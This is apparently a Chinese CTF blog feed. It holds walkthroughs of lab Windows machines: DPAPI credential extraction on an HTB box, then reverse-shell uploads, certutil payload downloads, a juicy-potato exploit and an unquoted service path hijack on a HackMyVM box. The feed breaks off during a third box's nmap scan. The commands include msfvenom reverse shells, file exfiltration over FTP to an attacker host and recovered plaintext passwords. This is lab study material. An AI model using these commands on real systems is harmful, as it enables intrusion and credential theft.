char:1</span><br><span class="line">+ Get-ChildItem C:\Users\steph.cooper\AppData\Local\Microsoft\Protect\</span><br><span class="line">+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~</span><br><span class="line">    + CategoryInfo          : ObjectNotFound: (C:\Users\steph....rosoft\Protect\:String) [Get-ChildItem], ItemNotFoundException</span><br><span class="line">    + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.GetChildItemCommand</span><br><span class="line">*Evil-WinRM* PS C:\Users\steph.cooper\Documents&gt; Get-ChildItem -Hidden C:\Users\steph.cooper\AppData\Roaming\Microsoft\Credentials\</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Directory: C:\Users\steph.cooper\AppData\Roaming\Microsoft\Credentials</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Mode                 LastWriteTime         Length Name</span><br><span class="line">----                 -------------         ------ ----</span><br><span class="line">-a-hs-          3/8/2025   7:54 AM            414 C8D69EBE9A43E9DEBF6B5FBD48B521B9</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">*Evil-WinRM* PS C:\Users\steph.cooper\Documents&gt; Get-ChildItem -Hidden C:\Users\steph.cooper\AppData\Local\Microsoft\Protect\</span><br><span class="line">Cannot find path &#x27;C:\Users\steph.cooper\AppData\Local\Microsoft\Protect\&#x27; because it does not exist.</span><br><span class="line">At line:1 char:1</span><br><span class="line">+ Get-ChildItem -Hidden C:\Users\steph.cooper\AppData\Local\Microsoft\P ...</span><br><span class="line">+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~</span><br><span class="line">    + CategoryInfo          : ObjectNotFound: (C:\Users\steph....rosoft\Protect\:String) [Get-ChildItem], ItemNotFoundException</span><br><span class="line">    + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.GetChildItemCommand</span><br><span class="line">*Evil-WinRM* PS C:\Users\steph.cooper\Documents&gt; </span><br><span class="line">*Evil-WinRM* PS C:\Users\steph.cooper\Documents&gt; Get-ChildItem -Hidden C:\Users\steph.cooper\AppData\Roaming\Microsoft\Protect\</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Directory: C:\Users\steph.cooper\AppData\Roaming\Microsoft\Protect</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Mode                 LastWriteTime         Length Name</span><br><span class="line">----                 -------------         ------ ----</span><br><span class="line">-a-hs-          3/8/2025   7:40 AM             24 CREDHIST</span><br><span class="line">-a-hs-          3/8/2025   7:40 AM             76 SYNCHIST</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>很明显还是有DPAPI破解的</p><p>copy下来进行破解</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\Users\adam.silver&gt; (New-Object Net.WebClient).UploadFile(&#x27;ftp://10.10.14.41/incoming/556a2412-1275-4ccf-b721-e6a0b4f90407&#x27;, &#x27;C:\Users\steph.cooper\AppData\Roaming\Microsoft\Protect\S-1-5-21-1487982659-1829050783-2281216199-1107\556a2412-1275-4ccf-b721-e6a0b4f90407&#x27;)</span><br><span class="line"></span><br><span class="line">*Evil-WinRM* PS C:\Users\adam.silver\Documents&gt; (New-Object Net.WebClient).UploadFile(&#x27;ftp://10.10.14.41/incoming/C8D69EBE9A43E9DEBF6B5FBD48B521B9&#x27;, &#x27;C:\Users\steph.cooper\AppData\Roaming\Microsoft\Credentials\C8D69EBE9A43E9DEBF6B5FBD48B521B9&#x27;)</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[/srv/ftp/incoming]</span><br><span class="line">└─# impacket-dpapi masterkey -t puppy.htb/steph.cooper:&#x27;ChefSteph2025!&#x27;@10.10.11.70 -file 556a2412-1275-4ccf-b721-e6a0b4f90407</span><br><span class="line">Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies </span><br><span class="line"></span><br><span class="line">[MASTERKEYFILE]</span><br><span class="line">Version     :        2 (2)</span><br><span class="line">Guid        : 556a2412-1275-4ccf-b721-e6a0b4f90407</span><br><span class="line">Flags       :        0 (0)</span><br><span class="line">Policy      : 4ccf1275 (1288639093)</span><br><span class="line">MasterKeyLen: 00000088 (136)</span><br><span class="line">BackupKeyLen: 00000068 (104)</span><br><span class="line">CredHistLen : 00000000 (0)</span><br><span class="line">DomainKeyLen: 00000174 (372)</span><br><span class="line"></span><br><span class="line">Decrypted key using rpc call</span><br><span class="line">Decrypted key: 0xd9a570722fbaf7149f9f9d691b0e137b7413c1414c452f9c77d6d8a8ed9efe3ecae990e047debe4ab8cc879e8ba99b31cdb7abad28408d8d9cbfdcaf319e9c84</span><br><span class="line">                                                                                                                                                           </span><br><span class="line">┌──(root㉿kali)-[/srv/ftp/incoming]</span><br><span class="line">└─# impacket-dpapi credential -file C8D69EBE9A43E9DEBF6B5FBD48B521B9 -key &#x27;0xd9a570722fbaf7149f9f9d691b0e137b7413c1414c452f9c77d6d8a8ed9efe3ecae990e047debe4ab8cc879e8ba99b31cdb7abad28408d8d9cbfdcaf319e9c84&#x27;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies </span><br><span class="line"></span><br><span class="line">[CREDENTIAL]</span><br><span class="line">LastWritten : 2025-03-08 15:54:29</span><br><span class="line">Flags       : 0x00000030 (CRED_FLAGS_REQUIRE_CONFIRMATION|CRED_FLAGS_WILDCARD_MATCH)</span><br><span class="line">Persist     : 0x00000003 (CRED_PERSIST_ENTERPRISE)</span><br><span class="line">Type        : 0x00000002 (CRED_TYPE_DOMAIN_PASSWORD)</span><br><span class="line">Target      : Domain:target=PUPPY.HTB</span><br><span class="line">Description : </span><br><span class="line">Unknown     : </span><br><span class="line">Username    : steph.cooper_adm</span><br><span class="line">Unknown     : FivethChipOnItsWay2025!</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>得到steph.cooper_adm的密码其是admin组的直接可以去拿flag了</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[/myift/bachang/htb/8/1]</span><br><span class="line">└─# evil-winrm -i dc.puppy.htb -u steph.cooper_adm -p FivethChipOnItsWay2025!</span><br><span class="line">                                        </span><br><span class="line">Evil-WinRM shell v3.7</span><br><span class="line">                                        </span><br><span class="line">Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc&#x27; for module Reline</span><br><span class="line">                                        </span><br><span class="line">Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion</span><br><span class="line">                                        </span><br><span class="line">Info: Establishing connection to remote endpoint</span><br><span class="line">*Evil-WinRM* PS C:\Users\steph.cooper_adm\Documents&gt; cd ..</span><br><span class="line"></span><br><span class="line">*Evil-WinRM* PS C:\Users\steph.cooper_adm\desktop&gt; cd ..</span><br><span class="line">*Evil-WinRM* PS C:\Users\steph.cooper_adm&gt; cd ..</span><br><span class="line">*Evil-WinRM* PS C:\Users\Administrator&gt; cd desktop</span><br><span class="line">*Evil-WinRM* PS C:\Users\Administrator\desktop&gt; dir</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Directory: C:\Users\Administrator\desktop</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Mode                 LastWriteTime         Length Name</span><br><span class="line">----                 -------------         ------ ----</span><br><span class="line">-ar---         7/26/2025   7:07 AM             34 root.txt</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">*Evil-WinRM* PS C:\Users\Administrator\desktop&gt; type root.txt</span><br><span class="line">d78af2****************************</span><br><span class="line">*Evil-WinRM* PS C:\Users\Administrator\desktop&gt; </span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>hackmyvm_quoted</title>
      <link href="/2025/07/23/hackmyvm-quoted/"/>
      <url>/2025/07/23/hackmyvm-quoted/</url>
      
        <content type="html"><![CDATA[<p><img src="/../imgs/$%7Bfiilename%7D/image-20250719195443228.png" alt="image-20250719195443228"></p><p><img src="/../imgs/$%7Bfiilename%7D/image-20250719200407486.png" alt="image-20250719200407486"></p><p>有ftp服务并且可以匿名登录并且进行get,put操作</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ftp&gt; get iisstart.htm</span><br><span class="line">local: iisstart.htm remote: iisstart.htm</span><br><span class="line">229 Entering Extended Passive Mode (|||49166|)</span><br><span class="line">150 Opening ASCII mode data connection.</span><br><span class="line">100% |**********************************************************************************************************************************************************************|   689      667.51 KiB/s    00:00 ETA</span><br><span class="line">226 Transfer complete.</span><br><span class="line">689 bytes received in 00:00 (501.00 KiB/s)</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">└─# cat iisstart.htm  </span><br><span class="line">&lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD XHTML 1.0 Strict//EN&quot; &quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd&quot;&gt;</span><br><span class="line">&lt;html xmlns=&quot;http://www.w3.org/1999/xhtml&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=iso-8859-1&quot; /&gt;</span><br><span class="line">&lt;title&gt;IIS7&lt;/title&gt;</span><br><span class="line">&lt;style type=&quot;text/css&quot;&gt;</span><br><span class="line">&lt;!--</span><br><span class="line">body &#123;</span><br><span class="line">        color:#000000;</span><br><span class="line">        background-color:#B3B3B3;</span><br><span class="line">        margin:0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">#container &#123;</span><br><span class="line">        margin-left:auto;</span><br><span class="line">        margin-right:auto;</span><br><span class="line">        text-align:center;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">a img &#123;</span><br><span class="line">        border:none;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">--&gt;</span><br><span class="line">&lt;/style&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;div id=&quot;container&quot;&gt;</span><br><span class="line">&lt;a href=&quot;http://go.microsoft.com/fwlink/?linkid=66138&amp;amp;clcid=0x409&quot;&gt;&lt;img src=&quot;welcome.png&quot; alt=&quot;IIS7&quot; width=&quot;571&quot; height=&quot;411&quot; /&gt;&lt;/a&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;                                   </span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ftp&gt; put user.txt</span><br><span class="line">local: user.txt remote: user.txt</span><br><span class="line">229 Entering Extended Passive Mode (|||49167|)</span><br><span class="line">150 Opening ASCII mode data connection.</span><br><span class="line">100% |**********************************************************************************************************************************************************************|    32       17.36 KiB/s    00:00 ETA</span><br><span class="line">226 Transfer complete.</span><br><span class="line">32 bytes sent in 00:00 (11.59 KiB/s)</span><br><span class="line">ftp&gt; ls</span><br><span class="line">229 Entering Extended Passive Mode (|||49168|)</span><br><span class="line">125 Data connection already open; Transfer starting.</span><br><span class="line">10-05-24  12:16PM       &lt;DIR&gt;          aspnet_client</span><br><span class="line">10-05-24  12:27AM                  689 iisstart.htm</span><br><span class="line">07-19-25  02:45PM                   32 user.txt</span><br><span class="line">10-05-24  12:27AM               184946 welcome.png</span><br><span class="line">226 Transfer complete.</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>所以我们直接上传一个aspx码反弹shell即可</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# msfvenom -p windows/x64/shell_reverse_tcp lhost=192.168.56.103 lport=8888 -a x64 --platform Windows -f aspx -o shell.aspx</span><br><span class="line">No encoder specified, outputting raw payload</span><br><span class="line">Payload size: 460 bytes</span><br><span class="line">Final size of aspx file: 3412 bytes</span><br><span class="line">Saved as: shell.aspx</span><br></pre></td></tr></table></figure><p><img src="/../imgs/$%7Bfiilename%7D/image-20250719203031920.png" alt="image-20250719203031920"></p><p>找到userflag</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">c:\Users\quoted\Desktop&gt;whoami /all</span><br><span class="line">whoami /all</span><br><span class="line"></span><br><span class="line">KULLANICI B�LG�LER�</span><br><span class="line">-------------------</span><br><span class="line"></span><br><span class="line">Kullan�c� ad�                SID     </span><br><span class="line">============================ ========</span><br><span class="line">nt authority\network service S-1-5-20</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">GRUP B�LG�LER�</span><br><span class="line">--------------</span><br><span class="line"></span><br><span class="line">Grup Ad�                             T�r              SID                                                           �znitelikler                                                </span><br><span class="line">==================================== ================ ============================================================= ============================================================</span><br><span class="line">Zorunlu Etiket\Sistem Zorunlu D�zeyi Etiket           S-1-16-16384                                                                                                              </span><br><span class="line">Everyone                             �yi bilinen grup S-1-1-0                                                       Zorunlu grup, Varsay�lan olarak etkin, Etkinle�tirilmi� grup</span><br><span class="line">BUILTIN\Users                        Di�er Ad         S-1-5-32-545                                                  Zorunlu grup, Varsay�lan olarak etkin, Etkinle�tirilmi� grup</span><br><span class="line">NT AUTHORITY\SERVICE                 �yi bilinen grup S-1-5-6                                                       Zorunlu grup, Varsay�lan olarak etkin, Etkinle�tirilmi� grup</span><br><span class="line">KONSOL OTURUMU A�MA                  �yi bilinen grup S-1-2-1                                                       Zorunlu grup, Varsay�lan olarak etkin, Etkinle�tirilmi� grup</span><br><span class="line">NT AUTHORITY\Authenticated Users     �yi bilinen grup S-1-5-11                                                      Zorunlu grup, Varsay�lan olarak etkin, Etkinle�tirilmi� grup</span><br><span class="line">NT AUTHORITY\This Organization       �yi bilinen grup S-1-5-15                                                      Zorunlu grup, Varsay�lan olarak etkin, Etkinle�tirilmi� grup</span><br><span class="line">BUILTIN\IIS_IUSRS                    Di�er Ad         S-1-5-32-568                                                  Zorunlu grup, Varsay�lan olarak etkin, Etkinle�tirilmi� grup</span><br><span class="line">LOCAL                                �yi bilinen grup S-1-2-0                                                       Zorunlu grup, Varsay�lan olarak etkin, Etkinle�tirilmi� grup</span><br><span class="line">IIS APPPOOL\DefaultAppPool           �yi bilinen grup S-1-5-82-3006700770-424185619-1745488364-794895919-4004696415 Zorunlu grup, Varsay�lan olarak etkin, Etkinle�tirilmi� grup</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">AYRICALIK B�LG�LER�</span><br><span class="line">----------------------</span><br><span class="line"></span><br><span class="line">Ayr�cal�k Ad�                 A��klama                                                 Durum     </span><br><span class="line">============================= ======================================================== ==========</span><br><span class="line">SeAssignPrimaryTokenPrivilege ��lem d�zeyi belirtecini de�i�tir                        Devre D���</span><br><span class="line">SeIncreaseQuotaPrivilege      ��lem i�in bellek kotalar� ayarla                        Devre D���</span><br><span class="line">SeSecurityPrivilege           Denetimi ve g�venlik g�nl���n� y�net                     Devre D���</span><br><span class="line">SeShutdownPrivilege           Sistemi kapat                                            Devre D���</span><br><span class="line">SeAuditPrivilege              G�venlik denetimleri olu�tur                             Devre D���</span><br><span class="line">SeChangeNotifyPrivilege       �apraz ge�i� denetimini atla                             Etkin     </span><br><span class="line">SeUndockPrivilege             Bilgisayar� takma biriminden ��kar                       Devre D���</span><br><span class="line">SeImpersonatePrivilege        Kimlik do�rulamas�ndan sonra istemcinin �zelliklerini al Etkin     </span><br><span class="line">SeCreateGlobalPrivilege       Genel nesneler olu�tur                                   Etkin     </span><br><span class="line">SeIncreaseWorkingSetPrivilege ��lem �al��ma k�mesini art�r                             Devre D���</span><br><span class="line">SeTimeZonePrivilege           Saat dilimini de�i�tir                                   Devre D���</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>很重要的一点是<code>SeImpersonatePrivilege</code> 特权</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">这个特权允许一个服务账户在认证后模拟（Impersonate）一个客户端。在某些情况下，通过链式利用 Windows 的其他特性（如命名管道或 DCOM），可以滥用这个特权，最终将权限提升到 SYSTEM 或 Administrator。</span><br><span class="line"></span><br><span class="line">常用的利用工具和技术通常被称为 &quot;Potato&quot; 系列漏洞，例如 Juicy Potato (或其现代版本 Rogue Potato/PrintSpoofer)。</span><br></pre></td></tr></table></figure><p>利用msf做</p><p>先去得到一个Meterpreter shell</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">─# msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.56.103 LPORT=8081 -f exe &gt; shell1.exe</span><br><span class="line">[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload</span><br><span class="line">[-] No arch selected, selecting arch: x86 from the payload</span><br><span class="line">No encoder specified, outputting raw payload</span><br><span class="line">Payload size: 354 bytes</span><br><span class="line">Final size of exe file: 73802 bytes</span><br></pre></td></tr></table></figure><p>上传</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">└─# python3 -m http.server 80</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">c:\&gt;certutil -urlcache -split -f http://192.168.56.103:80/shell1.exe c:\shell.exe</span><br><span class="line">certutil -urlcache -split -f http://192.168.56.103:80/shell1.exe c:\shell.exe</span><br><span class="line">****  �evrimi�i  ****</span><br><span class="line">  0000  ...</span><br><span class="line">  1c00</span><br><span class="line">CertUtil: -URLCache komutu ba�ar�yla tamamland�.</span><br><span class="line"></span><br><span class="line">c:\&gt;dir</span><br><span class="line">dir</span><br><span class="line"> C s�r�c�s�ndeki birimin etiketi yok.</span><br><span class="line"> Birim Seri Numaras�: D4DC-8644</span><br><span class="line"></span><br><span class="line"> c:\ dizini</span><br><span class="line"></span><br><span class="line">05.10.2024  13:23    &lt;DIR&gt;          dotNet Update</span><br><span class="line">05.10.2024  00:30    &lt;DIR&gt;          inetpub</span><br><span class="line">14.07.2009  06:20    &lt;DIR&gt;          PerfLogs</span><br><span class="line">05.10.2024  00:12    &lt;DIR&gt;          Program Files</span><br><span class="line">05.10.2024  00:21    &lt;DIR&gt;          Program Files (x86)</span><br><span class="line">19.07.2025  16:33             7.168 shell.exe</span><br><span class="line">05.10.2024  12:16    &lt;DIR&gt;          Users</span><br><span class="line">05.10.2024  00:27    &lt;DIR&gt;          Windows</span><br><span class="line">               1 Dosya            7.168 bayt</span><br><span class="line">               7 Dizin   22.105.141.248 bayt bo�</span><br><span class="line"></span><br><span class="line">c:\&gt;shell.exe</span><br><span class="line">shell.exe</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msf6 &gt; use exploit/multi/handler</span><br><span class="line">[*] Using configured payload generic/shell_reverse_tcp</span><br><span class="line">msf6 exploit(multi/handler) &gt; show options </span><br><span class="line"></span><br><span class="line">Payload options (generic/shell_reverse_tcp):</span><br><span class="line"></span><br><span class="line">   Name   Current Setting  Required  Description</span><br><span class="line">   ----   ---------------  --------  -----------</span><br><span class="line">   LHOST                   yes       The listen address (an interface may be specified)</span><br><span class="line">   LPORT  4444             yes       The listen port</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Wildcard Target</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">View the full module info with the info, or info -d command.</span><br><span class="line"></span><br><span class="line">msf6 exploit(multi/handler) &gt; set LHOST 192.168.56.103</span><br><span class="line">LHOST =&gt; 192.168.56.103</span><br><span class="line">msf6 exploit(multi/handler) &gt; set LPORT 8081</span><br><span class="line">LPORT =&gt; 8081</span><br><span class="line">msf6 exploit(multi/handler) &gt; set PAYLOAD windows/meterpreter/reverse_tcp</span><br><span class="line">PAYLOAD =&gt; windows/meterpreter/reverse_tcp</span><br><span class="line">msf6 exploit(multi/handler) &gt; run</span><br><span class="line">[*] Started reverse TCP handler on 192.168.56.103:8081 </span><br><span class="line">[-] Command shell session 1 is not valid and will be closed</span><br><span class="line">[*] 192.168.56.108 - Command shell session 1 closed.</span><br><span class="line">[-] Command shell session 2 is not valid and will be closed</span><br><span class="line">[*] 192.168.56.108 - Command shell session 2 closed.</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这里不知道为什么很快shell就会被终止</p><p>下面的步骤应该是</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; background </span><br><span class="line">[*] Backgrounding session 1...</span><br><span class="line">msf6 post(windows/gather/enum_patches) &gt; use exploit/multi/handler</span><br><span class="line">[*] Using configured payload windows/meterpreter/reverse_tcp</span><br><span class="line">msf6 exploit(multi/handler) &gt; use post/multi/recon/local_exploit_suggester</span><br><span class="line">msf6 post(multi/recon/local_exploit_suggester) &gt; run</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msf6 &gt; use exploit/windows/local/ms16_075_reflection_juicy</span><br><span class="line">msf6 exploit(windows/local/ms16_075_reflection_juicy) &gt; set session 1</span><br><span class="line">msf6 exploit(windows/local/ms16_075_reflection_juicy) &gt; set LHOST 192.168.56.105</span><br><span class="line">msf6 exploit(windows/local/ms16_075_reflection_juicy) &gt; exploit </span><br><span class="line">[*] Started reverse TCP handler on 192.168.56.105:4444 </span><br><span class="line">[+] Target appears to be vulnerable (Windows 7 Service Pack 1)</span><br><span class="line">[*] Launching notepad to host the exploit...</span><br><span class="line">[+] Process 2500 launched.</span><br><span class="line">[*] Reflectively injecting the exploit DLL into 2500...</span><br><span class="line">[*] Injecting exploit into 2500...</span><br><span class="line">[*] Exploit injected. Injecting exploit configuration into 2500...</span><br><span class="line">[*] Configuration injected. Executing exploit...</span><br><span class="line">[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.</span><br><span class="line">[*] Sending stage (177734 bytes) to 192.168.56.123</span><br><span class="line">[*] Meterpreter session 2 opened (192.168.56.105:4444 -&gt; 192.168.56.123:49176) </span><br><span class="line"></span><br><span class="line">meterpreter &gt; getuid</span><br><span class="line">Server username: NT AUTHORITY\SYSTEM</span><br></pre></td></tr></table></figure><p>我们用其他的方法做(Unquoted Service Path Exploit)</p><p><img src="/../imgs/$%7Bfiilename%7D/image-20250720161406732.png" alt="image-20250720161406732"></p><p>这里就很明显</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">没有加双引号 &quot;&quot;，这是典型的未引用路径漏洞（Unquoted Service Path）。</span><br><span class="line"></span><br><span class="line">当系统启动服务时，可能会按以下顺序寻找可执行文件：</span><br><span class="line">C:\dotNet.exe</span><br><span class="line">C:\dotNet\Update.exe</span><br><span class="line">C:\dotNet Update\dotnet.exe</span><br><span class="line">可以：</span><br><span class="line">在 C:\ 下写入 dotNet.exe，或在 C:\dotNet\ 下写入 Update.exe</span><br><span class="line">将恶意 payload 命名为 Update.exe</span><br><span class="line">启动 PEService</span><br><span class="line">Payload 将以该服务权限（很可能是 LocalSystem）运行</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[/myift/bachang/win]</span><br><span class="line"></span><br><span class="line">└─# msfvenom -p windows/x64/shell_reverse_tcp lhost=192.168.56.103 lport=2345 -f exe &gt; dotNet.exe </span><br><span class="line"></span><br><span class="line">[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload</span><br><span class="line"></span><br><span class="line">[-] No arch selected, selecting arch: x64 from the payload</span><br><span class="line"></span><br><span class="line">No encoder specified, outputting raw payload</span><br><span class="line"></span><br><span class="line">Payload size: 460 bytes</span><br><span class="line"></span><br><span class="line">Final size of exe file: 7168 bytes</span><br><span class="line"></span><br><span class="line">把这个码上传</span><br><span class="line"></span><br><span class="line">再sc start PEService即可拿到shell</span><br><span class="line"></span><br><span class="line">┌──(root㉿kali)-[/myift/bachang/win]</span><br><span class="line"></span><br><span class="line">└─# nc -lvnp 2345             </span><br><span class="line"></span><br><span class="line">listening on [any] 2345 ...</span><br><span class="line"></span><br><span class="line">connect to [192.168.56.103] from (UNKNOWN) [192.168.56.108] 49181</span><br><span class="line"></span><br><span class="line">Microsoft Windows [S�r�m 6.1.7601]</span><br><span class="line"></span><br><span class="line">Telif Hakk� (c) 2009 Microsoft Corporation. T�m haklar� sakl�d�r.</span><br></pre></td></tr></table></figure><p>没有没有 winPEAS、accesschk 等工具的话</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">reg query &quot;HKLM\SYSTEM\CurrentControlSet\Services&quot; /s /v ImagePath</span><br></pre></td></tr></table></figure><p>列出服务<br>检查是否存在空格但没加引号<br>python脚本直接筛选</p><p><img src="/../imgs/$%7Bfiilename%7D/image-20250720164450544.png" alt="image-20250720164450544"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">c:\&gt;sc qc PEService</span><br><span class="line">sc qc PEService</span><br><span class="line">[SC] QueryServiceConfig BA�ARILI</span><br><span class="line"></span><br><span class="line">SERVICE_NAME: PEService</span><br><span class="line">        TYPE               : 10  WIN32_OWN_PROCESS </span><br><span class="line">        START_TYPE         : 2   AUTO_START</span><br><span class="line">        ERROR_CONTROL      : 1   NORMAL</span><br><span class="line">        BINARY_PATH_NAME   : C:\dotNet Update\dotnet.exe</span><br><span class="line">        LOAD_ORDER_GROUP   : </span><br><span class="line">        TAG                : 0</span><br><span class="line">        DISPLAY_NAME       : PEService</span><br><span class="line">        DEPENDENCIES       : </span><br><span class="line">        SERVICE_START_NAME : LocalSystem</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>劫持就是LocalSystem了</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>hackmyvm_nessus</title>
      <link href="/2025/07/23/hackmyvm-nessus/"/>
      <url>/2025/07/23/hackmyvm-nessus/</url>
      
        <content type="html"><![CDATA[<p><img src="/../imgs/$%7Bfiilename%7D/image-20250721205230320.png" alt="image-20250721205230320"></p><p>信息采集</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# arp-scan -I eth1 192.168.56.0/24</span><br><span class="line">Interface: eth1, type: EN10MB, MAC: 00:0c:29:96:80:36, IPv4: 192.168.56.103</span><br><span class="line">Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)</span><br><span class="line">192.168.56.1    0a:00:27:00:00:0e       (Unknown: locally administered)</span><br><span class="line">192.168.56.100  08:00:27:81:30:5f       PCS Systemtechnik GmbH</span><br><span class="line">192.168.56.156  08:00:27:c0:51:50       PCS Systemtechnik GmbH</span><br><span class="line"></span><br><span class="line">3 packets received by filter, 0 packets dropped by kernel</span><br><span class="line">Ending arp-scan 1.10.0: 256 hosts scanned in 2.242 seconds (114.18 hosts/sec). 3 responded</span><br><span class="line">                                                                                                                                                                                                                  </span><br><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# nmap -sV -sC -p- 192.168.56.156</span><br><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-07-22 08:01 EDT</span><br><span class="line">Nmap scan report for 192.168.56.156</span><br><span class="line">Host is up (0.00057s latency).</span><br><span class="line">Not shown: 65523 closed tcp ports (reset)</span><br><span class="line">PORT      STATE SERVICE            VERSION</span><br><span class="line">135/tcp   open  msrpc              Microsoft Windows RPC</span><br><span class="line">139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn</span><br><span class="line">445/tcp   open  microsoft-ds?</span><br><span class="line">5985/tcp  open  http               Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span><br><span class="line">|_http-title: Not Found</span><br><span class="line">|_http-server-header: Microsoft-HTTPAPI/2.0</span><br><span class="line">8834/tcp  open  ssl/nessus-xmlrpc?</span><br><span class="line">| ssl-cert: Subject: commonName=WIN-C05BOCC7F0H/organizationName=Nessus Users United/stateOrProvinceName=NY/countryName=US</span><br><span class="line">| Not valid before: 2024-10-18T17:36:17</span><br><span class="line">|_Not valid after:  2028-10-17T17:36:17</span><br><span class="line">|_ssl-date: TLS randomness does not represent time</span><br><span class="line">| fingerprint-strings: </span><br><span class="line">|   GetRequest: </span><br><span class="line">|     HTTP/1.1 200 OK</span><br><span class="line">|     Cache-Control: must-revalidate</span><br><span class="line">|     X-Frame-Options: DENY</span><br><span class="line">|     Content-Type: text/html</span><br><span class="line">|     ETag: fc785d9fb222132265fb83f9adb1608e</span><br><span class="line">|     Connection: close</span><br><span class="line">|     X-XSS-Protection: 1; mode=block</span><br><span class="line">|     Server: NessusWWW</span><br><span class="line">|     Date: Wed, 23 Jul 2025 03:02:58 GMT</span><br><span class="line">|     X-Content-Type-Options: nosniff</span><br><span class="line">|     Content-Length: 1217</span><br><span class="line">|     Content-Security-Policy: upgrade-insecure-requests; block-all-mixed-content; form-action &#x27;self&#x27;; frame-ancestors &#x27;none&#x27;; frame-src https://store.tenable.com; default-src &#x27;self&#x27;; connect-src &#x27;self&#x27; www.tenable.com; script-src &#x27;self&#x27; www.tenable.com; img-src &#x27;self&#x27; data:; style-src &#x27;self&#x27; www.tenable.com; object-src &#x27;none&#x27;; base-uri &#x27;self&#x27;;</span><br><span class="line">|     Strict-Transport-Security: max-age=31536000</span><br><span class="line">|     Expect-CT: max-age=0</span><br><span class="line">|     &lt;!doctype html&gt;</span><br><span class="line">|     &lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">|     &lt;head&gt;</span><br><span class="line">|     &lt;meta http-equiv=&quot;X-UA-Compatible&quot; 